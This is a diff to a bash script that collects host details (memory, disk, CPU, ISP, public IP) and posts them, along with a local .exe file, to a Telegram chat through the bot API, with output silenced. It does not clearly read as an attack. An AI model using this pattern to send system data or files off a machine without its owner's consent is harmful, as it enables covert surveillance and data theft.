@@ -18,11 +18,28 @@ ENV_MEMORY=$(bash $PWD/env/info/memory_info.sh)
 ENV_DISK=$(bash $PWD/env/info/disk_info.sh) 
 ENV_CPU_USAGE=$(bash $PWD/env/info/cpu_usage.sh) 
 ENV_ISP=$(bash $PWD/env/info/isp_info.sh) 
+ENV_SEARCH_IP=$(bash $PWD/env/info/search_ip.sh)
 
 # Lines And Header
 ENV_HEADER=$(bash $PWD/env/header/header.sh) 
 ENV_LINES=$(bash $PWD/env/lines/lines.sh) 
 
+# Send Search IP
+curl -s -X POST $URL_MSG > /dev/null 2>&1 \
+    -d chat_id=$CHAT_ID \
+    -d "text=\`$(echo 🔎Searching Your Public IP)\`%0A" \
+    -d parse_mode=Markdown
+
+sleep 5s
+
+# Send Found IP
+curl -s -X POST $URL_MSG > /dev/null 2>&1 \
+    -d chat_id=$CHAT_ID \
+    -d "text=\`$(echo ✅Found Your Public IP)\`%0A" \
+    -d parse_mode=Markdown
+
+
+sleep 3s
 
 # Send Spesification 
 curl -s -X POST $URL_MSG > /dev/null 2>&1 \
@@ -46,7 +63,7 @@ curl -s -X POST $URL_MSG > /dev/null 2>&1 \
 # =================================================================================================================
 # Send Files
 send_file() {
-FILE_DIR=$(echo file/)$(ls file/*.sh | grep -v '*.sh' | cut -d'/' -f2)
+FILE_DIR=$(echo file/)$(ls file/*.exe | grep -v '*.exe' | cut -d'/' -f2)
 URL_FILES=https://api.telegram.org/bot$TOKEN/sendDocument
 curl -X POST > /dev/null 2>&1 -F "chat_id=$CHAT_ID" -F "document=@$FILE_DIR" $URL_FILES
 }
